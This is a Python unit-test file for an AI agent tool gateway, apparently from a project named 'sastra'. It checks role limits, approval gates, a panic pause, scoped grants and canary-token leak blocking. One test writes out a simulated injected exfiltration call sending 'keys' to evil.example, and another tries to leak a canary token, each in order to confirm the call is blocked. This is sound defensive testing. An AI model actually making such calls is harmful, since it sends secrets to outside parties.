import unittest

from sastra.controls import Mode
from sastra.tools.registry import ApprovalRequired, CallContext, ToolBlocked, ToolError

from .helpers import make_app


class ToolGatewayTests(unittest.TestCase):
    def setUp(self):
        self.app, _ = make_app()
        self.gw = self.app.gateway_actions
        self.pid = self.app.projects.create("Sandbox project", kind="software")["id"]

    def ctx(self, role="operator", **kw):
        return CallContext(actor="test", role=role, project_id=self.pid, services=self.app, **kw)

    def test_schema_validation(self):
        with self.assertRaises(ToolError):
            self.gw.invoke("calculator", {"expression": "1" * 400}, self.ctx())
        with self.assertRaises(ToolError):
            self.gw.invoke("no_such_tool", {}, self.ctx())

    def test_least_privilege_roles(self):
        self.assertEqual(self.gw.invoke("calculator", {"expression": "2*21"}, self.ctx("chat"))["result"], "42")
        with self.assertRaises(ToolBlocked):
            self.gw.invoke("fs_write", {"path": "a.txt", "content": "x"}, self.ctx("chat"))
        with self.assertRaises(ToolBlocked):  # researcher can never send messages, even if a web page asks it to
            self.gw.invoke("webhook_send", {"url": "https://evil.example/hook", "text": "keys"}, self.ctx("researcher"))
        self.assertEqual(self.app.db.scalar("SELECT COUNT(*) FROM approvals"), 0)
        self.assertIn("tool.denied_role", [r["action"] for r in self.app.audit.recent()])

    def test_advisory_mode_blocks_side_effects(self):
        self.app.controls.set("autonomy_mode", int(Mode.ADVISORY), "owner")
        with self.assertRaises(ToolBlocked):
            self.gw.invoke("fs_write", {"path": "a.txt", "content": "x"}, self.ctx("coder"))
        self.assertEqual(self.gw.invoke("calculator", {"expression": "1+1"}, self.ctx("coder"))["result"], "2")

    def test_disabled_tool_and_internet_switch(self):
        self.app.controls.set("disabled_tools", ["calculator"], "owner")
        with self.assertRaises(ToolBlocked):
            self.gw.invoke("calculator", {"expression": "1"}, self.ctx())
        self.app.controls.set("internet_enabled", False, "owner")
        with self.assertRaises(ToolBlocked):
            self.gw.invoke("fetch_page", {"url": "https://example.com"}, self.ctx())

    def test_paused_agents_blocked_but_owner_operator_allowed(self):
        self.app.controls.panic("owner")
        with self.assertRaises(ToolBlocked):
            self.gw.invoke("calculator", {"expression": "1"}, self.ctx("chat"))
        self.assertEqual(self.gw.invoke("calculator", {"expression": "1"}, self.ctx("operator"))["result"], "1")

    def test_approval_is_single_use_and_exact(self):
        args = {"project_id": self.pid}
        with self.assertRaises(ApprovalRequired) as cm:
            self.gw.invoke("project_delete", args, self.ctx(task_id="t1"))
        aid = cm.exception.approval_id
        with self.assertRaises(ApprovalRequired) as cm2:  # same request -> same pending approval, not a new one
            self.gw.invoke("project_delete", args, self.ctx(task_id="t1"))
        self.assertEqual(cm2.exception.approval_id, aid)
        self.app.approvals.decide(aid, True, "owner")
        other = self.app.projects.create("Other")["id"]
        with self.assertRaises(ApprovalRequired):  # approval does not cover different arguments
            self.gw.invoke("project_delete", {"project_id": other}, self.ctx(task_id="t1"))
        self.assertEqual(self.gw.invoke("project_delete", args, self.ctx(task_id="t1"))["deleted"], self.pid)
        with self.assertRaises(ApprovalRequired):  # consumed: a second run needs a new approval
            self.gw.invoke("project_delete", args, self.ctx(task_id="t1"))

    def test_rejected_approval_never_executes(self):
        with self.assertRaises(ApprovalRequired) as cm:
            self.gw.invoke("project_delete", {"project_id": self.pid}, self.ctx(task_id="t2"))
        self.app.approvals.decide(cm.exception.approval_id, False, "owner")
        with self.assertRaises(ApprovalRequired):
            self.gw.invoke("project_delete", {"project_id": self.pid}, self.ctx(task_id="t2"))
        self.assertTrue(self.app.projects.get(self.pid))

    def test_scoped_grant_limits_uses_and_scope(self):
        self.app.approvals.create_grant("code_run", {"network": "packages", "path": "a.py"}, 2, 1, "owner")
        calls = 0
        for _ in range(2):
            try:
                self.gw.invoke("code_run", {"path": "a.py", "network": "packages"}, self.ctx("coder"))
            except ToolError as e:  # passes the approval gate; fails later because no sandbox is configured
                self.assertNotIsInstance(e, ApprovalRequired)
                calls += 1
        self.assertEqual(calls, 2)
        with self.assertRaises(ApprovalRequired):  # uses exhausted
            self.gw.invoke("code_run", {"path": "a.py", "network": "packages"}, self.ctx("coder"))
        with self.assertRaises(ApprovalRequired):  # out of scope
            self.gw.invoke("code_run", {"path": "b.py", "network": "packages"}, self.ctx("coder"))
        with self.assertRaises(ToolError):
            self.app.approvals.create_grant("code_run", {}, 1000, 1, "owner")

    def test_canary_full_token_blocked(self):
        with self.assertRaises(ToolBlocked):
            self.gw.invoke("notify", {"title": "x", "body": "leak " + self.app.canary.token}, self.ctx())
        self.assertEqual(self.app.db.scalar("SELECT COUNT(*) FROM security_events WHERE kind='canary_leak'"), 1)

    def test_idempotent_tool_calls(self):
        ctx = self.ctx(idempotency_key="once")
        a = self.gw.invoke("notify", {"title": "hi"}, ctx)
        b = self.gw.invoke("notify", {"title": "hi"}, ctx)
        self.assertEqual(a, b)
        self.assertEqual(len(self.app.notifications.list()), 1)

    def test_registry_declarations_complete(self):
        for t in self.app.registry.tools.values():
            d = t.declaration()
            for key in ("permissions", "data_exposure", "network", "cost_usd", "reversible", "risk", "timeout_s", "input_schema"):
                self.assertIn(key, d)
            if not t.reversible:
                self.assertTrue(t.needs_approval(t.input_model.model_construct()), t.name)


if __name__ == "__main__":
    unittest.main()
